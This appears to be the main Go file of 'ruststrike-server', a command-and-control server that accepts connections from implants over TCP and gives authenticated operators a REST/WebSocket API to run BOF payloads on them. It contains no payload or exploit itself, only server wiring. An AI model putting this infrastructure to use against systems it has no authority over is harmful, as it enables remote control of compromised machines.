// ruststrike-server: the operator-facing service core.
//
// Two listeners:
//   - TCP (default :4444): the implant transport — newline-delimited JSON,
//     same wire contract as crates/protocol. Each implant becomes a Session.
//   - HTTP (default :8080): authenticated REST + WebSocket for the GUI/operator.
//
// Config:
//
//	Copy ruststrike.config.example.json to ruststrike.config.json, or pass
//	-config <path>. Environment variables still override matching config fields.
//
// Usage:
//
//	go-server [-config ruststrike.config.json] [tcp-port] [http-port]
//
// REST:
//
//	GET  /api/implants                      list sessions
//	POST /api/implants/{id}/hello           link check
//	POST /api/implants/{id}/bof             body {bof, args} (bof = lib name or b64)
//	DELETE /api/implants/{id}               drop session
//	GET  /api/bofs                          list BOF library
//	POST /api/bofs                          upload {name, file_b64}
//	POST /api/bofs/{name}/run?implant=<id>  body {args} (b64)
//
// WS:
//
//	/ws  -> live event stream (implant_connected/disconnected/hello/output/error)
//
// Operator HTTP/WS auth:
//
//	auth.token must be configured. Clients send Authorization: Bearer <token>.
package main

import (
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"sync"
	"time"
)

// globals wired in main(); read by handlers/goroutines.
var (
	manager        *SessionManager
	bus            *EventBus
	boflib         *BofLib
	tasks          *TaskStore
	store          *Store
	listenerMgr    *ListenerManager
	sysinfoColl    *SysinfoCollector
	relayRegistry  *RelayRegistry
	baseImplantExe string
	logMu          sync.Mutex
	logOut         io.Writer = os.Stderr
)

// logf returns a writer safe for concurrent logging lines.
func logf() io.Writer { return logOut }

func main() {
	cfg, err := loadAppConfig(os.Args[1:])
	if err != nil {
		fmt.Fprintf(os.Stderr, "[core] config: %v\n", err)
		os.Exit(1)
	}
	if cfg.ConfigPath != "" {
		fmt.Fprintf(os.Stderr, "[core] config: %s\n", cfg.ConfigPath)
	}
	if err := configureOperatorAuth(cfg.Auth); err != nil {
		fmt.Fprintf(os.Stderr, "[core] auth: %v\n", err)
		os.Exit(1)
	}
	baseImplantExe = cfg.Paths.ImplantExe

	bus = NewEventBus()
	manager = NewSessionManager(bus)
	tasks = NewTaskStore()
	tasks.StartReaper()
	sysinfoColl = NewSysinfoCollector()
	relayRegistry = NewRelayRegistry()

	// SQLite store (logs + listener config + agents + artifacts). Pure-Go
	// modernc.org/sqlite — no cgo. Path via RUSTSTRIKE_DB env, else next to exe.
	st, err := NewStore(cfg.Paths.DBPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[core] store: %v\n", err)
		os.Exit(1)
	}
	store = st
	// Persist every bus event as a log row (non-blocking, best-effort).
	go func() {
		ch := bus.Subscribe()
		for ev := range ch {
			store.LogEnqueue(time.Now().Unix(), ev.ImplantID, ev.Type, ev.Data)
		}
	}()

	// BOF library dir: RUSTSTRIKE_BOFS env var, else ./bofs next to the exe
	// (so it works regardless of the current working directory).
	bofDir := cfg.Paths.BOFDir
	if bofDir == "" {
		if exe, err := os.Executable(); err == nil {
			bofDir = filepath.Join(filepath.Dir(exe), "bofs")
		} else {
			bofDir = "bofs"
		}
	}
	boflib = NewBofLib(bofDir)
	fmt.Fprintf(os.Stderr, "[core] BOF library: %s\n", bofDir)

	// Listener manager: owns runtime start/stop of TCP implant listeners. The
	// default boot listener is created through it so the whole TCP set is
	// uniform + persisted. Persisted listeners from a prior run are restored.
	listenerMgr = NewListenerManager(manager, store, bus)
	if rows, err := store.ListListeners(); err == nil {
		listenerMgr.Restore(rows)
	}
	// If no default listener exists yet, create the boot one.
	if !hasListenerOnPort(cfg.Server.ImplantTCPPort) {
		if _, err := listenerMgr.Create(cfg.Server.DefaultListenerName, cfg.Server.ImplantBindIP, cfg.Server.ImplantTCPPort); err != nil {
			fmt.Fprintf(os.Stderr, "[core] tcp bind %s: %v\n", net.JoinHostPort(cfg.Server.ImplantBindIP, cfg.Server.ImplantTCPPort), err)
			os.Exit(1)
		}
	}
	fmt.Fprintf(os.Stderr, "[core] implant TCP listeners: %d\n", len(listenerMgr.ListInfo()))

	// HTTP/WS for operators.
	mux := http.NewServeMux()
	mountAPI(mux)
	handler := requireOperatorAuth(mux)
	httpAddr := net.JoinHostPort(cfg.Server.OperatorBindIP, cfg.Server.OperatorHTTPPort)
	fmt.Fprintf(os.Stderr, "[core] operator HTTP on %s (auth required, try POST /api/auth/login, GET /api/implants, ws /ws)\n", httpAddr)
	if err := http.ListenAndServe(httpAddr, handler); err != nil {
		fmt.Fprintf(os.Stderr, "[core] http: %v\n", err)
		os.Exit(1)
	}
}

// hasListenerOnPort reports whether a listener on the given port already
// exists (restored from config), so we don't double-bind the boot port.
func hasListenerOnPort(port string) bool {
	for _, l := range listenerMgr.ListInfo() {
		if l.Port == port {
			return true
		}
	}
	return false
}
